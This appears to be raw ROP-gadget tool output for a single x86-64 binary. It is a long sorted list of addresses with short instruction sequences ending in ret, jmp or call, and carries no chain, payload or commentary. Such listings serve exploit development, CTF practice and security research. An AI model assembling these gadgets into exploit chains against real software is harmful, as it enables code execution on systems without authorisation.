0x0000000000436b19 : lea rax, [rdi + 2] ; ret
0x0000000000436b24 : lea rax, [rdi + 3] ; ret
0x0000000000436b37 : lea rax, [rdi + 4] ; ret
0x0000000000436b4c : lea rax, [rdi + 5] ; ret
0x0000000000436b6a : lea rax, [rdi + 6] ; ret
0x0000000000436b76 : lea rax, [rdi + 7] ; ret
0x0000000000436b89 : lea rax, [rdi + 8] ; ret
0x0000000000436b9e : lea rax, [rdi + 9] ; ret
0x000000000041d768 : lea rax, [rdi + rax + 0x10] ; ret
0x000000000041d778 : lea rax, [rdi + rax + 0x20] ; ret
0x000000000041d672 : lea rax, [rdi + rax + 0x30] ; ret
0x000000000045fea4 : lea rax, [rdi + rax - 0x20] ; vzeroupper ; ret
0x00000000004326d6 : lea rax, [rdi + rax] ; ret
0x0000000000438f49 : lea rax, [rdi + rcx] ; sub rax, rsi ; ret
0x000000000045fb58 : lea rax, [rdi + rsi] ; ret
0x0000000000436af2 : lea rax, [rdi] ; ret
0x00000000004360dc : lea rax, [rdx + 0xa] ; ret
0x00000000004360fc : lea rax, [rdx + 0xb] ; ret
0x000000000043611e : lea rax, [rdx + 0xc] ; ret
0x000000000043613e : lea rax, [rdx + 0xd] ; ret
0x000000000043615e : lea rax, [rdx + 0xe] ; ret
0x0000000000435fee : lea rax, [rdx + 0xf] ; ret
0x0000000000436016 : lea rax, [rdx + 1] ; ret
0x000000000043602c : lea rax, [rdx + 2] ; ret
0x0000000000436044 : lea rax, [rdx + 3] ; ret
0x000000000043605a : lea rax, [rdx + 4] ; ret
0x000000000043606c : lea rax, [rdx + 5] ; ret
0x000000000043608a : lea rax, [rdx + 6] ; ret
0x0000000000435f96 : lea rax, [rdx + 7] ; ret
0x000000000043609c : lea rax, [rdx + 8] ; ret
0x00000000004360bc : lea rax, [rdx + 9] ; ret
0x00000000004155c5 : lea rax, [rdx - 0x10] ; ret
0x0000000000436004 : lea rax, [rdx] ; ret
0x000000000043ee80 : lea rax, [rip + 0x263479] ; ret
0x000000000044a823 : lea rbp, [rdi + rax] ; mov rdi, rbp ; call r12
0x000000000043638d : lea rcx, [r11 + rcx] ; jmp rcx
0x000000000046064a : lea rcx, [rax + 1] ; call rbx
0x00000000004607e5 : lea rcx, [rax + 4] ; lea r9, [rsp + 0x20] ; call rbx
0x00000000004155d5 : lea rcx, [rdx - 8] ; cmovne rax, rcx ; ret
0x00000000004620d6 : lea rcx, [rsi + rcx*4] ; add eax, dword ptr [rcx + rdx] ; ret
0x000000000043e1de : lea rdi, [rcx + rax + 0x20] ; jmp rdx
0x00000000004139e2 : lea rdi, [rip + 0x67d4f] ; call 0x40fc89
0x000000000041fd53 : lea rdx, [r11 + rdx] ; jmp rdx
0x0000000000420147 : lea rdx, [rdx - 0x40] ; jmp r9
0x000000000043926e : lea rsi, [rsi + rcx - 1] ; std ; rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x00000000004743bb : leave ; add eax, dword ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x0000000000447a3a : leave ; call r15
0x000000000047d5b1 : leave ; cli ; jmp rdx
0x00000000004389d0 : leave ; jne 0x4389c3 ; ret
0x0000000000438a80 : leave ; jne 0x438a73 ; ret
0x0000000000438d40 : leave ; jne 0x438d37 ; sub rax, 1 ; ret
0x0000000000460e7a : leave ; jne 0x460e37 ; mov rax, rdx ; ret
0x0000000000462320 : leave ; jne 0x462374 ; ret
0x0000000000462391 : leave ; jne 0x462381 ; ret
0x0000000000438f48 : leave ; lea rax, [rdi + rcx] ; sub rax, rsi ; ret
0x0000000000475140 : leave ; movsxd rax, dword ptr [r8 + rcx*4] ; add rax, r8 ; jmp rax
0x000000000046434e : leave ; nop ; ret
0x0000000000400b32 : leave ; ret
0x0000000000492ff5 : leave ; std ; call qword ptr [rbx]
0x0000000000492ffd : leave ; std ; dec esp ; leave ; std ; jmp rsp
0x0000000000493001 : leave ; std ; jmp rsp
0x000000000046076a : leave ; xor edx, edx ; lea r9, [rsp + 0x20] ; call rbx
0x000000000048c627 : ljmp [rax + 0x60fffd01] ; add bh, ch ; jmp qword ptr [rax]
0x000000000048c4e3 : ljmp [rax + rax - 3] ; jmp rsp
0x000000000048c4df : ljmp [rax + rax - 3] ; ljmp [rax + rax - 3] ; jmp rsp
0x000000000048c363 : ljmp [rbp + rdi*8 - 4] ; jmp rsp
0x000000000048c377 : ljmp [rbp + rdi*8 - 4] ; ljmp [rbp + rdi*8 - 4] ; jmp rsp
0x000000000047d9d7 : ljmp [rbx + rcx*8 - 0x34760005] ; sti ; call rsi
0x000000000047b147 : ljmp [rbx] ; scasb al, byte ptr [rdi] ; clc ; call rbx
0x000000000047b143 : ljmp [rbx] ; scasb al, byte ptr [rdi] ; clc ; ljmp [rbx] ; scasb al, byte ptr [rdi] ; clc ; call rbx
0x000000000047df7f : ljmp [rdx + 0x62fffbd7] ; xlatb ; sti ; jmp rsp
0x000000000047d4d7 : ljmp [rdx - 0x3c] ; cli ; call qword ptr [rax]
0x000000000047d097 : ljmp [rsi + rbx*4] ; cli ; call rdx
0x000000000047d253 : ljmp [rsi] ; iretd ; cli ; call rsp
0x000000000041e96e : lock add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000049802c : lock add byte ptr [rax], al ; rcl byte ptr [rcx - 6], 1 ; call qword ptr [rdx]
0x000000000046ac57 : lock inc dword ptr [r9 + 0x10] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004082f0 : lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000438350 : lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add dh, dh ; ret 0x7501
0x000000000047cdf9 : lodsb al, byte ptr [rsi] ; cli ; call qword ptr [rax + 0x20fffaab]
0x000000000047ceb5 : lodsb al, byte ptr [rsi] ; cli ; jmp rdx
0x0000000000492ff4 : lodsb al, byte ptr [rsi] ; leave ; std ; call qword ptr [rbx]
0x000000000041c7a4 : lodsb al, byte ptr [rsi] ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000491d7d : lodsb al, byte ptr [rsi] ; or byte ptr [rdi + 0x26], al ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x000000000049ce54 : lodsb al, byte ptr [rsi] ; pop rsi ; std ; jmp qword ptr [rdx]
0x00000000004992e8 : lodsb al, byte ptr [rsi] ; push rbx ; add byte ptr [rax], al ; push rsp ; cli ; jmp rax
0x0000000000446cf8 : lodsb al, byte ptr [rsi] ; sti ; inc dword ptr [rcx - 0x77] ; ret 0x17e9
0x000000000047b1a5 : lodsd eax, dword ptr [rsi] ; clc ; inc dword ptr [rbp - 0x52] ; clc ; jmp qword ptr [rcx]
0x000000000047ce2d : lodsd eax, dword ptr [rsi] ; cli ; call rsi
0x000000000047ce29 : lodsd eax, dword ptr [rsi] ; cli ; inc dword ptr [rsi - 0x53] ; cli ; call rsi
0x000000000047cded : lodsd eax, dword ptr [rsi] ; cli ; jmp rax
0x000000000046dfc2 : lodsd eax, dword ptr [rsi] ; ret
0x000000000041826d : loop 0x4182a5 ; shr byte ptr [rcx], 0xc8 ; ret
0x0000000000426e7a : loop 0x426e75 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000426e79 : loop 0x426e76 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000042999a : loop 0x429995 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429999 : loop 0x429996 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043a4ef : loop 0x43a509 ; movsxd rax, dword ptr [rsi + rdx*4] ; add rax, rsi ; jmp rax
0x000000000043dc25 : loop 0x43dc1c ; ret
0x000000000043dc43 : loop 0x43dc96 ; mov dword ptr [rdi + 0x20], edx ; mov byte ptr [rdi + 0x28], 1 ; ret
0x0000000000458ab8 : loop 0x458abe ; dec dword ptr [rcx + 0x63] ; ret
0x0000000000471ba4 : loop 0x471baf ; add rdx, rax ; jmp 0x471bb8
0x0000000000477439 : loop 0x477488 ; add esp, 0x18 ; ret
0x000000000049211a : loop 0x49216f ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x0000000000426dea : loope 0x426de5 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000426de9 : loope 0x426de6 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000042990a : loope 0x429905 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000429909 : loope 0x429906 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043707b : loope 0x437085 ; add byte ptr [rax], al ; lea rax, [rdi + 0xf] ; ret
0x000000000043a9ee : loope 0x43a9e5 ; ret
0x000000000043fb5e : loope 0x43fb6b ; pop rbx ; shl eax, cl ; pop rbp ; pop r12 ; ret
0x000000000046107e : loope 0x461093 ; je 0x4610a4 ; ret
0x000000000046851b : loope 0x468521 ; dec dword ptr [rcx - 0x77] ; ret
0x000000000046de57 : loope 0x46dea9 ; mov dword ptr [rdi], ecx ; ret
0x000000000046de88 : loope 0x46dedb ; mov dword ptr [rdi - 8], ecx ; ret
0x000000000046defd : loope 0x46df50 ; mov dword ptr [rdi - 0x10], ecx ; ret
0x000000000047a446 : loope 0x47a4a5 ; ret
0x000000000047aa1e : loope 0x47aa80 ; pop rbp ; pop r12 ; ret
0x0000000000401d08 : loopne 0x401d6c ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000407ab7 : loopne 0x407b1d ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000040da96 : loopne 0x40dafd ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000041234e : loopne 0x412362 ; xchg eax, esp ; ret 0x7ae9
0x0000000000415d93 : loopne 0x415dc1 ; add bh, dh ; ret 0
0x00000000004201a1 : loopne 0x4201b8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004201a0 : loopne 0x4201b9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004202f1 : loopne 0x420308 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004202f0 : loopne 0x420309 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420441 : loopne 0x420458 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420440 : loopne 0x420459 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420591 : loopne 0x4205a8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420590 : loopne 0x4205a9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004206e1 : loopne 0x4206f8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004206e0 : loopne 0x4206f9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420831 : loopne 0x420848 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420830 : loopne 0x420849 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420981 : loopne 0x420998 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420980 : loopne 0x420999 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420acf : loopne 0x420ae6 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420ace : loopne 0x420ae7 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420c21 : loopne 0x420c38 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420c20 : loopne 0x420c39 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420d71 : loopne 0x420d88 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420d70 : loopne 0x420d89 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420ec1 : loopne 0x420ed8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000420ec0 : loopne 0x420ed9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000421011 : loopne 0x421028 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000421010 : loopne 0x421029 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000421161 : loopne 0x421178 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000421160 : loopne 0x421179 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004212b1 : loopne 0x4212c8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004212b0 : loopne 0x4212c9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000421401 : loopne 0x421418 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000421400 : loopne 0x421419 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000422b71 : loopne 0x422b88 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000422b70 : loopne 0x422b89 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000422cc1 : loopne 0x422cd8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000422cc0 : loopne 0x422cd9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000422e11 : loopne 0x422e28 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000422e10 : loopne 0x422e29 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000422f61 : loopne 0x422f78 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000422f60 : loopne 0x422f79 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004230b1 : loopne 0x4230c8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004230b0 : loopne 0x4230c9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423201 : loopne 0x423218 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423200 : loopne 0x423219 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423351 : loopne 0x423368 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423350 : loopne 0x423369 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042349f : loopne 0x4234b6 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042349e : loopne 0x4234b7 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004235f1 : loopne 0x423608 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004235f0 : loopne 0x423609 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423741 : loopne 0x423758 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423740 : loopne 0x423759 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423891 : loopne 0x4238a8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423890 : loopne 0x4238a9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004239e1 : loopne 0x4239f8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004239e0 : loopne 0x4239f9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423b31 : loopne 0x423b48 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423b30 : loopne 0x423b49 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423c81 : loopne 0x423c98 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423c80 : loopne 0x423c99 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423dd1 : loopne 0x423de8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000423dd0 : loopne 0x423de9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000043a45d : loopne 0x43a477 ; movsxd rcx, dword ptr [rsi + rax*4] ; add rcx, rsi ; jmp rcx
0x000000000043da88 : loopne 0x43da9d ; cmp eax, 4 ; je 0x43da97 ; ret
0x000000000043fb62 : loopne 0x43fbc5 ; pop r12 ; ret
0x000000000045c029 : loopne 0x45c08d ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000045e4ac : loopne 0x45e513 ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000464d44 : loopne 0x464daa ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000464e02 : loopne 0x464e68 ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000046b5d3 : loopne 0x46b635 ; pop rbp ; pop r12 ; ret
0x000000000046b5f0 : loopne 0x46b652 ; pop rbp ; pop r12 ; ret
0x000000000046b630 : loopne 0x46b692 ; pop rbp ; pop r12 ; ret
0x000000000046d9ed : loopne 0x46d9f6 ; sub eax, 1 ; ret
0x0000000000472f24 : loopne 0x472f8a ; sar rax, 3 ; pop rbp ; pop r12 ; ret
0x000000000047d8c0 : loopne 0x47d85b ; sti ; push rax ; xchg eax, edx ; sti ; call qword ptr [rax]
0x000000000047fba4 : loopne 0x47fb46 ; cld ; jmp qword ptr [rax]
0x000000000048d5c0 : loopne 0x48d56d ; std ; jmp qword ptr [rax]
0x000000000048f6f4 : loopne 0x48f6d4 ; cld ; test al, 0x97 ; xchg eax, esp ; ret
0x0000000000497370 : loopne 0x4973f3 ; stc ; call qword ptr [rax]
0x0000000000497e90 : loopne 0x497edd ; cli ; jmp qword ptr [rcx]
0x0000000000499900 : loopne 0x49991d ; sti ; call qword ptr [rbx]
0x000000000048f10a : mov ah, 0x13 ; ret
0x0000000000442c80 : mov ah, 0x24 ; cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x000000000048f5b0 : mov ah, 0xa5 ; ret
0x000000000047cd60 : mov ah, 0xae ; cli ; inc dword ptr [rsi + rbp*4 - 6] ; call rsp
0x000000000040500d : mov ah, 0xff ; dec dword ptr [rax - 0x77] ; ret 0xf748
0x000000000048ef04 : mov ah, bl ; push rsi ; ret
0x000000000040abb3 : mov al, 0 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000475286 : mov al, 0 ; add byte ptr [rax], al ; ret
0x0000000000447a34 : mov al, 0 ; add byte ptr [rax], al ; xor r9d, r9d ; call r15
0x0000000000497d60 : mov al, 0x40 ; cli ; call qword ptr [rbx]
0x000000000043cc98 : mov al, 0x4c ; mov edi, ebp ; mov rsi, qword ptr [rax] ; call r14
0x000000000049cef0 : mov al, 0x5f ; std ; jmp qword ptr [rcx]
0x000000000049ceec : mov al, 0x8f ; add byte ptr [rax], al ; mov al, 0x5f ; std ; jmp qword ptr [rcx]
0x000000000047d8dc : mov al, 0x93 ; sti ; inc eax ; xchg eax, ebx ; sti ; call rax
0x000000000047d900 : mov al, 0x94 ; sti ; call rax
0x000000000047d014 : mov al, 0x9e ; cli ; inc dword ptr [rax - 0x62] ; cli ; jmp rsi
0x000000000047ce04 : mov al, 0xaa ; cli ; inc dword ptr [rax - 0x56] ; cli ; call rax
0x0000000000432a9f : mov al, 0xc5 ; std ; xlatb ; ret
0x000000000047d2fc : mov al, 0xd1 ; cli ; inc dword ptr [rax - 0x2f] ; cli ; call rax
0x00000000004630f4 : mov al, 0xd3 ; stc ; dec dword ptr [rax + 0x39] ; ret
0x00000000004913b6 : mov al, 0xee ; fcmovb st(0), st(3) ; ret
0x000000000047e708 : mov al, 0xfe ; sti ; jmp rax
0x0000000000434876 : mov al, byte ptr [rcx + 2] ; mov byte ptr [rdx + 2], al ; mov rax, rdi ; ret
0x0000000000434894 : mov al, byte ptr [rcx + 4] ; mov byte ptr [rdx + 4], al ; mov rax, rdi ; ret
0x0000000000436000 : mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; lea rax, [rdx] ; ret
0x0000000000434850 : mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x000000000049c2d8 : mov al, ch ; std ; jmp qword ptr [rdi]
0x0000000000434860 : mov ax, word ptr [rcx] ; mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x0000000000427bb1 : mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x0000000000447dff : mov bh, 0x47 ; or cl, byte ptr [rax + 0x39] ; ret 0x1176
0x0000000000436f18 : mov bh, 0x48 ; lea eax, [rdi + 7] ; ret
0x000000000045a285 : mov bh, 0x4f ; and al, 0 ; mov rax, qword ptr [rax + rsi*8] ; jmp rax
0x00000000004903e4 : mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret
0x000000000040b369 : mov bh, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x0000000000416995 : mov bh, 0xe7 ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x0000000000491af3 : mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x000000000043880e : mov bl, 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000460e7c : mov bl, 0x48 ; mov eax, edx ; ret
0x00000000004914c3 : mov bl, 0x8e ; ret 0xdcd9
0x000000000045115d : mov bl, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000040bc3b : mov bl, 0xe8 ; jmp rdi
0x000000000046f749 : mov bl, 8 ; mov ecx, 0x1f0fff ; pop rbx ; ret
0x000000000049bfc4 : mov byte ptr [rax + 0x4d80000], al ; std ; jmp qword ptr [rcx]
0x000000000040f724 : mov byte ptr [rax + rsi], bh ; ret
0x000000000040f723 : mov byte ptr [rax + rsi], dil ; ret
0x00000000004692c5 : mov byte ptr [rax - 0x77], cl ; ret
0x00000000004982b8 : mov byte ptr [rax - 6], bl ; call qword ptr [rcx]
0x00000000004490ba : mov byte ptr [rax], 0x2f ; mov byte ptr [rdi], 0 ; pop rbx ; pop r14 ; ret
0x00000000004490fd : mov byte ptr [rax], 0x2f ; mov byte ptr [rdi], 0 ; ret
0x000000000049c81d : mov byte ptr [rax], al ; add al, dh ; xor ch, bh ; jmp qword ptr [rdx]
0x000000000049c745 : mov byte ptr [rax], al ; add byte ptr [rax + 0x2d], bh ; std ; jmp qword ptr [rdx]
0x0000000000400d34 : mov byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000049c835 : mov byte ptr [rax], al ; add byte ptr [rax], cl ; xor ebp, edi ; jmp rdx
0x000000000047b1a4 : mov byte ptr [rbp - 0x51ba0008], ch ; clc ; jmp qword ptr [rcx]
0x000000000045701e : mov byte ptr [rbp - 0x910], bh ; jmp qword ptr [rdx + rax*8]
0x000000000045701d : mov byte ptr [rbp - 0x910], dil ; jmp qword ptr [rdx + rax*8]
0x000000000049dac4 : mov byte ptr [rbx - 0x42b80000], bl ; std ; call qword ptr [rdx]
0x00000000004498b3 : mov byte ptr [rcx + rax - 0x3a], cl ; jmp rsi
0x0000000000475144 : mov byte ptr [rcx + rax - 0x40], cl ; jmp rax
0x0000000000403d46 : mov byte ptr [rcx - 0x75], 0x47 ; add al, 0xeb ; ret
0x00000000004054ff : mov byte ptr [rcx], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043c951 : mov byte ptr [rcx], 0x75 ; or esi, ebx ; ret
0x00000000004453d7 : mov byte ptr [rcx], 9 ; ret 0x3948
0x000000000044cfcb : mov byte ptr [rcx], dh ; or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x000000000040f80d : mov byte ptr [rcx], dl ; je 0x40f859 ; mov qword ptr [rsi], rcx ; ret
0x0000000000436c68 : mov byte ptr [rdi + 0x10], dh ; lea rax, [rdi + 0x10] ; ret
0x00000000004365d8 : mov byte ptr [rdi + 0x10], dh ; ret
0x0000000000436cde : mov byte ptr [rdi + 0x14], dh ; lea rax, [rdi + 0x14] ; ret
0x000000000043662e : mov byte ptr [rdi + 0x14], dh ; ret
0x0000000000436d60 : mov byte ptr [rdi + 0x18], dh ; lea rax, [rdi + 0x18] ; ret
0x00000000004366b0 : mov byte ptr [rdi + 0x18], dh ; ret
0x000000000043dc12 : mov byte ptr [rdi + 0x28], 1 ; ret
0x0000000000436b16 : mov byte ptr [rdi + 2], dh ; lea rax, [rdi + 2] ; ret
0x00000000004364f6 : mov byte ptr [rdi + 2], dh ; ret
0x0000000000436b32 : mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; lea rax, [rdi + 4] ; ret
0x0000000000436512 : mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x0000000000436553 : mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x00000000004217cb : mov byte ptr [rdi - 1], dl ; ret
0x000000000040a4f0 : mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x00000000004490bd : mov byte ptr [rdi], 0 ; pop rbx ; pop r14 ; ret
0x0000000000449100 : mov byte ptr [rdi], 0 ; ret
0x000000000042a8f2 : mov byte ptr [rdi], cl ; ret
0x000000000043a1d5 : mov byte ptr [rdi], cl ; vzeroupper ; ret
0x0000000000436af0 : mov byte ptr [rdi], dh ; lea rax, [rdi] ; ret
0x00000000004364d0 : mov byte ptr [rdi], dh ; ret
0x0000000000427c23 : mov byte ptr [rdi], dl ; ret
0x0000000000436029 : mov byte ptr [rdx + 2], al ; lea rax, [rdx + 2] ; ret
0x0000000000434879 : mov byte ptr [rdx + 2], al ; mov rax, rdi ; ret
0x0000000000436057 : mov byte ptr [rdx + 4], al ; lea rax, [rdx + 4] ; ret
0x0000000000434897 : mov byte ptr [rdx + 4], al ; mov rax, rdi ; ret
0x00000000004981c4 : mov byte ptr [rdx], al ; add byte ptr [rax + 0x57], bh ; cli ; jmp qword ptr [rcx]
0x0000000000436002 : mov byte ptr [rdx], al ; lea rax, [rdx] ; ret
0x0000000000434852 : mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x0000000000475cb0 : mov byte ptr [rip + 0x22e4f9], 8 ; ret
0x0000000000400a76 : mov byte ptr [rip + 0x2a2863], 1 ; pop rbp ; ret
0x000000000049aa88 : mov byte ptr [rsi - 4], al ; jmp qword ptr [rbx]
0x000000000046f35f : mov byte ptr [rsi], al ; jne 0x46f34f ; mov rax, rsi ; ret
0x000000000046f3e3 : mov byte ptr [rsi], al ; jne 0x46f3c7 ; mov rax, rsi ; ret
0x00000000004692c4 : mov byte ptr gs:[rax - 0x77], cl ; ret
0x000000000048ef02 : mov ch, 0x31 ; mov ah, bl ; push rsi ; ret
0x0000000000490243 : mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00000000004915df : mov ch, 0x99 ; in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x0000000000491f8a : mov ch, 0xab ; ret
0x000000000041f4e6 : mov ch, 6 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000444275 : mov ch, ah ; add al, byte ptr [rax] ; add bh, dh ; ret 0xf800
0x00000000004159b7 : mov cl, 0x35 ; ret
0x000000000048d659 : mov cl, 0xfd ; call qword ptr [rax]
0x000000000044a247 : mov cl, byte ptr [rax + 0x39] ; ror byte ptr [rax + 0xf], 1 ; ret 0x8b41
0x000000000042d0d5 : mov cl, byte ptr [rbx - 0x37d67dfc] ; ret
0x0000000000416c14 : mov cl, byte ptr [rdi - 0x73] ; adc al, 0xa ; jmp r10
0x00000000004913b2 : mov cl, byte ptr [rip - 0x114f09b0] ; fcmovb st(0), st(3) ; ret
0x000000000041e334 : mov cl, byte ptr [rsi + rdx - 1] ; sub eax, ecx ; ret
0x000000000042a8f0 : mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000046107b : mov cl, dl ; and cl, 0xf ; je 0x4610a7 ; ret
0x000000000049166c : mov cs, edi ; ret 0x8b36
0x000000000043165e : mov cs, word ptr [rip - 0x7cb80000] ; ret 0xe910
0x00000000004364f0 : mov cx, word ptr [rsi] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x000000000047836f : mov dh, 0 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000040bbed : mov dh, 0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040a8ff : mov dh, 0 ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040bbcb : mov dh, 0 ; ret
0x0000000000427c21 : mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x000000000041de84 : mov dh, 0x16 ; sub eax, edx ; ret
0x0000000000406264 : mov dh, 0x17 ; test dl, dl ; jne 0x40624a ; ret
0x000000000040f686 : mov dh, 0x21 ; sub dword ptr [rax], eax ; ret
0x0000000000405e69 : mov dh, 0x24 ; or cl, ch ; ret 0xfffc
0x0000000000406189 : mov dh, 0x40 ; or dword ptr [rax + rax*8 - 0x38b79f8c], eax ; ret 0xfff0
0x00000000004383e1 : mov dh, 0x47 ; cmc ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x00000000004383d1 : mov dh, 0x47 ; hlt ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x00000000004383a1 : mov dh, 0x47 ; int1 ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x00000000004383c1 : mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x00000000004383b1 : mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x000000000044c688 : mov dh, 0x47 ; or al, 0x83 ; ret
0x0000000000444387 : mov dh, 0x48 ; dec dword ptr [rax - 0x7d] ; ret 0x4801
